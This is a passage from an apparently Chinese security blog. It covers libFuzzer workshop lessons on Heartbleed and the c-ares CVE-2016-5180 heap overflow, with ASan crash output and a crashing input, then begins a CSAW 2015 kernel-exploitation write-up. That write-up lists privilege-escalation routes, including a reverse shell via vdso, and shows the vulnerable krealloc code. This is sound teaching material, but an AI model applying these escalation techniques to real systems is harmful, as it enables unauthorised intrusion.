class="keyword">if</span> (payload == <span class="number">18</span> &amp;&amp; seq == s-&gt;tlsext_hb_seq)</span><br><span class="line">&#123;</span><br><span class="line">s-&gt;tlsext_hb_seq++;</span><br><span class="line">s-&gt;tlsext_hb_pending = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞点再<code>memcpy(bp, pl, payload);</code>根据crash原因为over_flow说明payload的长度有问题。往上分析发现payload是通过n2s函数从p指向的结构体（用户数据包）内容得到的。该结构体为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ssl3_record_st</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="type">int</span> type;               / type of record /</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> length;    / How many bytes available /</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> off;       / read/write offset into <span class="string">&#x27;buf&#x27;</span> /</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> data;    / pointer to the record data /</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> input;   / where the decode bytes are /</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> comp;    / only used with decompression - <span class="built_in">malloc</span>()ed /</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> epoch;    / epoch number, needed by DTLS1 /</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> seq_num[<span class="number">8</span>]; / sequence number, needed by DTLS1 /</span><br><span class="line">    &#125; SSL3_RECORD;</span><br></pre></td></tr></table></figure><p>而程序并没有对用户可控的length做检查，从而导致memcpy溢出（有可能将server端的数据写入到返回数据包中返回给用户）。</p><p>初学libfuzzer，如有纰漏错误还烦请师傅们指正。</p><h6 id="lesson06-gogogo"><a href="#lesson06-gogogo" class="headerlink" title="lesson06 gogogo!"></a>lesson06 gogogo!</h6><p>06给出的是CVE-2016-5180漏洞，该漏洞可以实现在ChromeOS下的远程代码执行，无疑是高危漏洞。<br>PS：我觉得在学习libfuzzer的过程中，我们不能仅仅局限局限于获得了一个crash，还要进一步的去定位漏洞之所在，分析漏洞产生的原因，思考漏洞的利用方法和修补方式，这才是正确对待fuzz的态度以及漏洞挖掘的魅力所在。<br>如同05所作的步骤，我们要先对开源库进行编译</p><p>如果我们单纯直接编译而不进行编译插桩的话:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar xzvf c-ares.tgz</span><br><span class="line">cd c-ares</span><br><span class="line">./buildconf</span><br><span class="line">./configure</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>得到的fuzz效果为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="number">06</span> git:(master) ✗ ./c_ares_fuzzer                                                                    </span><br><span class="line">INFO: Seed: <span class="number">2221841816</span></span><br><span class="line">INFO: Loaded <span class="number">1</span> modules   (<span class="number">14</span> inline <span class="number">8</span>-bit counters): <span class="number">14</span> [<span class="number">0x7a7ef8</span>, <span class="number">0x7a7f06</span>), </span><br><span class="line">INFO: Loaded <span class="number">1</span> PC tables (<span class="number">14</span> PCs): <span class="number">14</span> [<span class="number">0x5700b8</span>,<span class="number">0x570198</span>), </span><br><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than <span class="number">4096</span> bytes</span><br><span class="line">INFO: A corpus is not provided, starting from an empty corpus</span><br><span class="line">#<span class="number">2</span>INITED cov: <span class="number">4</span> ft: <span class="number">5</span> corp: <span class="number">1</span>/<span class="number">1</span>b exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb</span><br><span class="line">#<span class="number">5</span>NEW    cov: <span class="number">5</span> ft: <span class="number">6</span> corp: <span class="number">2</span>/<span class="number">3</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb L: <span class="number">2</span>/<span class="number">2</span> MS: <span class="number">3</span> ShuffleBytes-ChangeByte-CopyPart-</span><br><span class="line">#<span class="number">1337</span>NEW    cov: <span class="number">8</span> ft: <span class="number">9</span> corp: <span class="number">3</span>/<span class="number">20</span>b lim: <span class="number">17</span> exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb L: <span class="number">17</span>/<span class="number">17</span> MS: <span class="number">2</span> ShuffleBytes-CrossOver-</span><br><span class="line">#<span class="number">1357</span>REDUCE cov: <span class="number">8</span> ft: <span class="number">9</span> corp: <span class="number">3</span>/<span class="number">19</span>b lim: <span class="number">17</span> exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb L: <span class="number">16</span>/<span class="number">16</span> MS: <span class="number">5</span> CrossOver-EraseBytes-CopyPart-ChangeBinInt-InsertRepeatedBytes-</span><br><span class="line">#<span class="number">524288</span>pulse  cov: <span class="number">8</span> ft: <span class="number">9</span> corp: <span class="number">3</span>/<span class="number">19</span>b lim: <span class="number">4096</span> exec/s: <span class="number">262144</span> rss: <span class="number">712</span>Mb</span><br><span class="line">#<span class="number">1048576</span>pulse  cov: <span class="number">8</span> ft: <span class="number">9</span> corp: <span class="number">3</span>/<span class="number">19</span>b lim: <span class="number">4096</span> exec/s: <span class="number">262144</span> rss: <span class="number">775</span>Mb</span><br><span class="line">#<span class="number">2097152</span>pulse  cov: <span class="number">8</span> ft: <span class="number">9</span> corp: <span class="number">3</span>/<span class="number">19</span>b lim: <span class="number">4096</span> exec/s: <span class="number">262144</span> rss: <span class="number">777</span>Mb</span><br><span class="line">#<span class="number">4194304</span>pulse  cov: <span class="number">8</span> ft: <span class="number">9</span> corp: <span class="number">3</span>/<span class="number">19</span>b lim: <span class="number">4096</span> exec/s: <span class="number">246723</span> rss: <span class="number">777</span>Mb</span><br><span class="line">#<span class="number">8388608</span>pulse  cov: <span class="number">8</span> ft: <span class="number">9</span> corp: <span class="number">3</span>/<span class="number">19</span>b lim: <span class="number">4096</span> exec/s: <span class="number">220752</span> rss: <span class="number">777</span>Mb</span><br></pre></td></tr></table></figure><p>出现如此boring的结果的原因再与缺少了编译时的选项设置，即没有在编译时进行插桩<br>插桩操作：在其中特定的的位置插入汇编代码，实现在程序执行到该处时能够通过此处的插桩掌握程序的执行路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar xzvf c-ares.tgz</span><br><span class="line">cd c-ares</span><br><span class="line">./buildconf</span><br><span class="line">./configure CC=&quot;clang -O2 -fno-omit-frame-pointer -g -fsanitize=address&quot;</span><br><span class="line">make CFLAGS=</span><br></pre></td></tr></table></figure><p>这里的<code>-fsanitize=address</code>即开启ASAN(Address Sanitizer)，编译时则会在目标代码的关键位置添加检查代码，例如：malloc(),free()等，一旦发现了内存访问错误，便可以SIGABRT中止程序。（即完成了编译插桩）<br>这里指定CC选项也是不规范的，提倡<code>CC = &quot;clang&quot; &amp;&amp; CFLAGS = &quot;-O2 -fno-omit-frame-pointer -g -fsanitize=address&quot;</code><br>顺利编译生成.a静态链接库文件，接着是编写fuzzer接口函数。<br>workshop提供给我们的harness如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright 2016 Google Inc. All Rights Reserved.</span></span><br><span class="line"><span class="comment">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/nameser.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ares.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line">  <span class="type">int</span> buflen;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> <span class="title function_">s</span><span class="params">(reinterpret_cast&lt;<span class="type">const</span> <span class="type">char</span> *&gt;(data), size)</span>;</span><br><span class="line">  ares_create_query(s.c_str(), ns_c_in, ns_t_a, <span class="number">0x1234</span>, <span class="number">0</span>, &amp;buf, &amp;buflen, <span class="number">0</span>);</span><br><span class="line">  ares_free_string(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到harness将输入的测试样本data类型转化为strings s，之后选择了<code>ares_creat_query</code>和<code>ares_free_strings</code>作为入口函数来进行fuzz。<br>编译：<code>clang++ -g c_ares_fuzzer.cc -O2 -fno-omit-frame-pointer -fsanitize=address,fuzzer -Ic-ares c-ares/.libs/libcares.a</code><br>运行后很快得到了crash说明提供的harness是很有效的，接口函数的选择合适。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="number">06</span> git:(master) ✗ ./c_ares_fuzzer </span><br><span class="line">INFO: Seed: <span class="number">3003118136</span></span><br><span class="line">INFO: Loaded <span class="number">1</span> modules   (<span class="number">11</span> inline <span class="number">8</span>-bit counters): <span class="number">11</span> [<span class="number">0x7f72c0</span>, <span class="number">0x7f72cb</span>), </span><br><span class="line">INFO: Loaded <span class="number">1</span> PC tables (<span class="number">11</span> PCs): <span class="number">11</span> [<span class="number">0x5b7740</span>,<span class="number">0x5b77f0</span>), </span><br><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than <span class="number">4096</span> bytes</span><br><span class="line">INFO: A corpus is not provided, starting from an empty corpus</span><br><span class="line">#<span class="number">2</span>INITED cov: <span class="number">4</span> ft: <span class="number">4</span> corp: <span class="number">1</span>/<span class="number">1</span>b exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb</span><br><span class="line">#<span class="number">10</span>NEW    cov: <span class="number">5</span> ft: <span class="number">5</span> corp: <span class="number">2</span>/<span class="number">3</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb L: <span class="number">2</span>/<span class="number">2</span> MS: <span class="number">3</span> ShuffleBytes-CrossOver-InsertByte-</span><br><span class="line">#<span class="number">1336</span>NEW    cov: <span class="number">7</span> ft: <span class="number">7</span> corp: <span class="number">3</span>/<span class="number">20</span>b lim: <span class="number">17</span> exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb L: <span class="number">17</span>/<span class="number">17</span> MS: <span class="number">1</span> CrossOver-</span><br><span class="line">#<span class="number">1385</span>REDUCE cov: <span class="number">7</span> ft: <span class="number">7</span> corp: <span class="number">3</span>/<span class="number">19</span>b lim: <span class="number">17</span> exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb L: <span class="number">16</span>/<span class="number">16</span> MS: <span class="number">4</span> CopyPart-EraseBytes-InsertByte-CopyPart-</span><br><span class="line">=================================================================</span><br><span class="line">==<span class="number">7322</span>==ERROR: AddressSanitizer: heap-buffer-overflow on address <span class="number">0x603000f7b654</span> at pc <span class="number">0x00000059bd4c</span> bp <span class="number">0x7fff83ba42b0</span> sp <span class="number">0x7fff83ba42a8</span></span><br><span class="line">WRITE of size <span class="number">1</span> at <span class="number">0x603000f7b654</span> thread T0</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x59bd4b</span> in ares_create_query /home/admin/libfuzzer-workshop/lessons/<span class="number">06</span>/c-ares/ares_create_query.c:<span class="number">196</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">1</span> <span class="number">0x59b33c</span> in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/<span class="number">06</span>/c_ares_fuzzer.cc:<span class="number">16</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x465fe6</span> in fuzzer::Fuzzer::ExecuteCallback(unsigned char <span class="keyword">const</span>*, unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">556</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x46b649</span> in fuzzer::Fuzzer::RunOne(unsigned char <span class="keyword">const</span>*, unsigned long, <span class="type">bool</span>, fuzzer::InputInfo*, <span class="type">bool</span>*) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">470</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x46b649</span> in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">699</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x46e66f</span> in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">830</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x4569f9</span> in fuzzer::FuzzerDriver(<span class="type">int</span>*, char***, <span class="type">int</span> (*)(unsigned char <span class="keyword">const</span>*, unsigned long)) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:<span class="number">824</span></span><br><span class="line">    #<span class="number">7</span> <span class="number">0x41f382</span> in main /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:<span class="number">19</span></span><br><span class="line">    #<span class="number">8</span> <span class="number">0x7f19eeaeabf6</span> in __libc_start_main (/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>+<span class="number">0x21bf6</span>)</span><br><span class="line">    #<span class="number">9</span> <span class="number">0x41f3f9</span> in _start (/home/admin/libfuzzer-workshop/lessons/<span class="number">06</span>/c_ares_fuzzer+<span class="number">0x41f3f9</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">0x603000f7b654</span> is located <span class="number">0</span> bytes to the right of <span class="number">20</span>-<span class="type">byte</span> region [<span class="number">0x603000f7b640</span>,<span class="number">0x603000f7b654</span>)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x552ef0</span> in malloc /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cpp:<span class="number">145</span></span><br><span class="line">    #<span class="number">1</span> <span class="number">0x59b826</span> in ares_create_query /home/admin/libfuzzer-workshop/lessons/<span class="number">06</span>/c-ares/ares_create_query.c:<span class="number">133</span>:<span class="number">10</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x59b33c</span> in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/<span class="number">06</span>/c_ares_fuzzer.cc:<span class="number">16</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x465fe6</span> in fuzzer::Fuzzer::ExecuteCallback(unsigned char <span class="keyword">const</span>*, unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">556</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x46b649</span> in fuzzer::Fuzzer::RunOne(unsigned char <span class="keyword">const</span>*, unsigned long, <span class="type">bool</span>, fuzzer::InputInfo*, <span class="type">bool</span>*) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">470</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x46b649</span> in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">699</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x46e66f</span> in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">830</span></span><br><span class="line">    #<span class="number">7</span> <span class="number">0x4569f9</span> in fuzzer::FuzzerDriver(<span class="type">int</span>*, char***, <span class="type">int</span> (*)(unsigned char <span class="keyword">const</span>*, unsigned long)) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:<span class="number">824</span></span><br><span class="line">    #<span class="number">8</span> <span class="number">0x41f382</span> in main /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:<span class="number">19</span></span><br><span class="line">    #<span class="number">9</span> <span class="number">0x7f19eeaeabf6</span> in __libc_start_main (/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>+<span class="number">0x21bf6</span>)</span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow /home/admin/libfuzzer-workshop/lessons/<span class="number">06</span>/c-ares/ares_create_query.c:<span class="number">196</span>:<span class="number">3</span> in ares_create_query</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x0c06801e7670</span>: fd fa fa fa fd fd fd fa fa fa fd fd fd fa fa fa</span><br><span class="line">  <span class="number">0x0c06801e7680</span>: fd fd fd fd fa fa fd fd fd fa fa fa fd fd fd fa</span><br><span class="line">  <span class="number">0x0c06801e7690</span>: fa fa fd fd fd fa fa fa fd fd fd fa fa fa fd fd</span><br><span class="line">  <span class="number">0x0c06801e76a0</span>: fd fa fa fa fd fd fd fd fa fa fd fd fd fa fa fa</span><br><span class="line">  <span class="number">0x0c06801e76b0</span>: fd fd fd fa fa fa fd fd fd fa fa fa fd fd fd fa</span><br><span class="line">=&gt;<span class="number">0x0c06801e76c0</span>: fa fa fd fd fd fa fa fa <span class="number">00</span> <span class="number">00</span>[<span class="number">04</span>]fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c06801e76d0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c06801e76e0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c06801e76f0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c06801e7700</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c06801e7710</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow <span class="type">byte</span> legend (one shadow <span class="type">byte</span> represents <span class="number">8</span> application bytes):</span><br><span class="line">  Addressable:           <span class="number">00</span></span><br><span class="line">  Partially addressable: <span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after <span class="keyword">return</span>:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==<span class="number">7322</span>==ABORTING</span><br><span class="line">MS: <span class="number">4</span> ChangeByte-ChangeBinInt-CopyPart-ChangeBit-; base unit: <span class="number">900229</span>d109e2354708da1b4fe903c1ef0e741ab8</span><br><span class="line"><span class="number">0xdc</span>,<span class="number">0x2e</span>,<span class="number">0x5c</span>,<span class="number">0x2e</span>,</span><br><span class="line">\xdc.\\.</span><br><span class="line">artifact_prefix=<span class="string">&#x27;./&#x27;</span>; Test unit written to ./crash<span class="number">-55</span>bfecc1f01482c0ec080b0da9ab7f50cd9fa363</span><br><span class="line">Base64: <span class="number">3</span>C5cLg==</span><br></pre></td></tr></table></figure><p>SUMMARY中:<code>SUMMARY: AddressSanitizer: heap-buffer-overflow /home/admin/libfuzzer-workshop/lessons/06/c-ares/ares_create_query.c:196:3 in ares_create_query</code>，了解到漏洞正位于<code>ares_create_query</code>函数中。定位一下漏洞点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ares_create_query.c:196:3</span></span><br><span class="line"><span class="comment">/* Finish off the question with the type and class. */</span></span><br><span class="line">DNS_QUESTION_SET_TYPE(q, type);</span><br><span class="line">DNS_QUESTION_SET_CLASS(q, dnsclass); <span class="comment">//漏洞点，该处存在heap_overflow</span></span><br></pre></td></tr></table></figure><p>但对于漏洞的具体产生方式进行溯源的话就要对代码进行审计，这里就不展开了。</p><p>到这里对libfuzzer的基本操作已经有了一个初步的认识，但fuzz的对象都是规模较小的开源库。当我们面对大规模的开源项目以及需要进行长时间的测试工作时，如何继续保持fuzz的高效进行以得到crash便是我们要继续研究的课题，这就涉及到一些对编译选项的设置以及对fuzz的一些额外条件的设定，这些都会可能会影响到fuzz的效率，等待这我们进一步的研究。</p>]]></content>
      
      
      
        <tags>
            
            <tag> FUZZ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel_pwn SringsIPC(P1)</title>
      <link href="/2020/11/20/kernel_pwn%20%E4%BB%8E%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E7%8B%AC%E5%86%99%E5%88%B0%E6%8F%90%E6%9D%83(1)/"/>
      <url>/2020/11/20/kernel_pwn%20%E4%BB%8E%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E7%8B%AC%E5%86%99%E5%88%B0%E6%8F%90%E6%9D%83(1)/</url>
      
        <content type="html"><![CDATA[<h3 id="Kernel-pwn-SringsIPC-P1"><a href="#Kernel-pwn-SringsIPC-P1" class="headerlink" title="Kernel_pwn SringsIPC(P1)"></a>Kernel_pwn SringsIPC(P1)</h3><blockquote><p>从任意地址读写到提权的三种方法：<br>1.修改cred结构体<br>2.改写vdso映射函数+反弹shell<br>3.劫持prctl执行过程的hp-&gt;hook指针</p></blockquote><p>这道题来自csaw-2015-ctf也是一道经典的内核题了，花了蛮久的时间去复现🤦</p><span id="more"></span><p>这题只给了程序的源代码main.c，需要我们自己搭建环境。我是懒狗，直接用了p4nda师傅的镜像和文件系统（十分感谢！😍）。<br>根据题目的名字猜测可能是实现了进程间通信过程中的的信箱机制（正好最近在做操作系统的IPC实验），但实际上是我想多了。</p><p>分析源码发现程序实现了对一片内存区域的申请，释放，读写，扩容，查寻操作。<br>漏洞点在扩容操作(realloc)函数中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">realloc_ipc_channel</span> <span class="params">( <span class="keyword">struct</span> ipc_state *state, <span class="type">int</span> id, <span class="type">size_t</span> size, <span class="type">int</span> grow )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_channel</span> *<span class="title">channel</span>;</span></span><br><span class="line">    <span class="type">size_t</span> new_size;</span><br><span class="line">    <span class="type">char</span> *new_data;</span><br><span class="line"></span><br><span class="line">    channel = get_channel_by_id(state, id);</span><br><span class="line">    <span class="keyword">if</span> ( IS_ERR(channel) )</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( grow )</span><br><span class="line">        new_size = channel-&gt;buf_size + size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        new_size = channel-&gt;buf_size - size;</span><br><span class="line"></span><br><span class="line">    new_data = krealloc(channel-&gt;data, new_size + <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> ( new_data == <span class="literal">NULL</span> )</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    channel-&gt;data = new_data;</span><br><span class="line">    channel-&gt;buf_size = new_size;</span><br><span class="line"></span><br><span class="line">    ipc_channel_put(state, channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>krealloc函数new_size是由channel-&gt;buf_size-size得到的，这两个值都可控，从而可以使得new_size+1&#x3D;&#x3D;0。根据krealloc函数源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * krealloc - reallocate memory. The contents will remain unchanged.</span></span><br><span class="line"><span class="comment"> * 